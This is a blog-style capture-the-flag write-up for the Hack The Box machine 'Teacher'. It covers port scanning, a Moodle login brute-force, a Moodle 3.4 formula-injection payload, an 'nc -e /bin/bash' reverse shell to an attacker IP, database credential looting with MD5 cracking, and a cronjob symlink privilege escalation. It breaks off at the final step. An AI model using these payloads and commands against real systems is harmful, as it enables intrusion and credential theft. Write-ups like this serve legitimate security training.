---
layout: post
comments: true
title: "Teacher HTB Write Up"
tags: ['hackthebox', 'writeup', 'moodle']
---

## Introduction
Hello everyone! Today we are going to be working on a HTB machine called Teacher. We will be practicing how to bruteforce some logins, also how to discover moodle version and how to attack an especific version of itself.


## Ports recognizement
We are going to be discovering all open ports and extract the output into a grepeable file called *allPorts*.

```bash
sudo nmap -sC -vvv -n -Pn -p- --open --min-rate 10000 10.10.10.153 -oG allPorts
```

We are going to use [getPorts][getPorts] in order to extract the ports from the grepeable file.

Now we can enummerate all the services that are running on the system.
```bash
sudo nmap -sC -vvv -n -Pn -p80 --min-rate 10000 10.10.10.153 -oN services
```
*services-photo*


## Inspect the website

Meanwhile we inspect the site we are going to leave wfuzz running.
```bash
wfuzz --hc 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -u http://10.10.10.153/FUZZ
```

Most of the visible links doesn't work, except one, *gallery.html*.
We can see a bunch of blurred pictures, so maybe we have to apply [steganography][steganography].

If we inspect the code we can notice that there is one picture that is slightly different than the other's.

*images-photo*<br>
We are going to request that photo in order to see what's hiding.

```bash
wget http://10.10.10.153/images/5.png -o fake_picture.png
```

If we try to see the picture:
```bash
feh fake_picture.png
```
*error-photo*

We have an error that tell us that this picture is not actually a picture.
We will try to enumerate his content:
```bash
cat fake_picture.png
```
The output:
```txt
Hi Servicedesk,

I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

Could you guys figure out what the last charachter is, or just reset it?

Thanks,
Giovanni
```
While all this happen we can check wfuzz again and we discover a few sites, there's one called *moodle* which have a login.🤟


## Bruteforce login

So now, we have the a potential teacher's username (Giovanni) and a incomplete password(Th4C00lTheacha) but we miss one character.

We can build a simple python3 script in order to get the last character of the password.
Here's the [script][python-script-bruteforce]
Simple brute force sciprt which try three usernames (giovanni, Giovanni, giovanni@backhatuni.htb)
In case they were using private mail server.

We got that the credentials are *giovanni:Th4C00lTheacha#*

We can login into moodle with that credentials.

If we inspect the chat he told the admin he wan't to make a quiz, that might be a clue.

## Get Moodle version

Now we have teacher's credentials we have to find any vulneravility in the moodle service.
If we search for Moodle into the [exploit database][exploitdatabase] we have a few vulneravilities, but the problem is that we don't have the moodle version.

I create a [script][moodlev] to get the version of a moodle service

If we run the script:
```bash
python3 authenticated_teacher_moodle_version.py -u http://10.10.10.153/moodle --username giovanni --password Th4C00lTheacha#
```

We have into the output that the moodle version is 3.4

Now if we look again in the [exploit database][exploitdatabase] filtering by 3.4 moodle version we can find that there's a vulneravility what allow us to inyect code into a specific quiz.
This [blog][article-moodle] relate very well the vulnearability if you want to check it out.

## Getting www-data shell

If we look into the courses we can see there's only one course wich is already finished (Algebra).
If we go into that course we can see a few resources into the course page.

*algebra-image*

We can click into the setting and then turn editing on.
The we can add an activity or resource and we add a quiz.

We have to set a random name, random description and we have to save and display. The we have to edit the quiz and add a new question which will be a *Calculated*.
<br>
We have to add a random question name, a random question text, we will have to set the grade on 100%.
On the formula field is the place in which we have to set the payload which is
```php
 /*{a*/`$_GET[0]`;//{x}}
```
*Again, there's more explanation about this exploit in this [blog][article-moodle]*

So we set this string into the filed and then we save changes.
Since the php service is waiting for the 0 in the url to be execute we have to add to the url the payload in order to get the reverse shell:
```bash
&0=(nc -e /bin/bash $IP $PORT)
```
Before executing this we have to listn with netcat on the port that we selected, for example 443.

```bash
nc -lvnp 443
```
We have a shell in www-data!

We can upgrade the shell with:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Lateral movement

If we list the users of the machine, we can see that giovanni is an user who's problably get the user flag.
We can try to grab it:
```bash
cat /home/giovanni/user.txt
```
But we got an error.

We can try switch the user with the same password that we used before to login into the moodle site, but doesn't work.

If we look into the server files we can see a pretty interesting file called config.php.
```bash
cat config.php
```

We can see the system that is running the database(mariadb), and some credentiales for the database(root:Welkom1!)

If we try to login yo mariadb
```bash
mariadb -u root -p
```
And we enter the password 'Welkom1!', we are inside the database!

### Enumerate the database

We can list the databases:
```sql
show databases;
```
Output:
```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| moodle             |
| mysql              |
| performance_schema |
| phpmyadmin         |
+--------------------+
```
moodle is an interesting database worth to explore.

Now we can list the tables:
```sql
show tables;
```
Now we have a lot of tables, but there is one particular table which drag my attention called *mdl_user*

We can describe the table;
```sql
describe mdl_user;
```

Now we have a lot of rows but again there are some rows particulally interesting, username and password.

So we create a query to list all the data about that fields:

```sql
select username, password from mdl_user;
```
We have and output:
```
+-------------+--------------------------------------------------------------+
| username    | password                                                     |
+-------------+--------------------------------------------------------------+
| guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
| admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
| giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
| Giovannibak | 7a860966115182402ed06375cf0a22af                             |
+-------------+--------------------------------------------------------------+
```
As we can see there some password hashed but there is one from the user Giovannibak which is different and can remember us md5.

If we use some online md5 decriptor we can see that the password encripted is *expelled*


Now we exit from the database and try to switch user with this password.

```bash
su giovanni
expelled
```

We enter into the giovani's account! We are in!
We can see the user flag.
```bash
cat /home/giovanni/user.txt
```


## Pivilege excalation

In the giovanni's workspace there are a few files. On one of them we can notice the timestamp of the file keep changing every minute so, we can deduce there is a cronjob replacing every minute the file.

We can search for a filename called backup
```bash
find / -name "*backup*" 2> /dev/null
```

We see a bunch of files called backup
There is one file called backup.sh
We can inspect that file:
```bash
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
```

We can replace the course folder allocated at work with a symlink to /root.
We have to wait a minute to the cronjob to take effect and all the content of root will be copied at our courses folder.

We can grab the flag!
```bash
cat root.txt
```

To create the symbolic link:




[article-moodle]:https://blog.sonarsource.com/moodle-remote-code-execution?redirect=rips

[moodlev]:https://github.com/isuckatlinux/moodleVersion
[exploitdatabase]:https://www.exploit-db.com/
[python-script-bruteforce]:https://github.com/isuckatlinux/htbmachines/blob/main/teacher/scripts/brute_pass_giovanni.py
[getPorts]:https://github.com/isuckatlinux/getPorts
[steganography]: https://www.youtube.com/watch?v=TWEXCYQKyDc
